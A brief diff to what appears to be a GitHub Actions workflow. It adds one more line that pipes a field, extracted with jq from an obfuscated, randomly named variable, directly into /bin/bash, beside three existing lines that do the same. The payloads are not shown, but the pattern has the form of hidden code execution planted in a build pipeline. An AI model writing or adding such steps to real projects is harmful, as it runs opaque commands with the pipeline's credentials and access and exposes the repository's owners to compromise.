@@ -22,6 +22,7 @@ jobs:
           echo $nhic25 | jq -r .mesfz7160 | /bin/bash
           printf '%s' "$zoeag397" | jq -r .f67 | /bin/bash
           printf '%s' "$wpmg10" | jq -r .u0 | /bin/bash
+          printf '%s' "$tud9638" | jq -r .xo1393 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
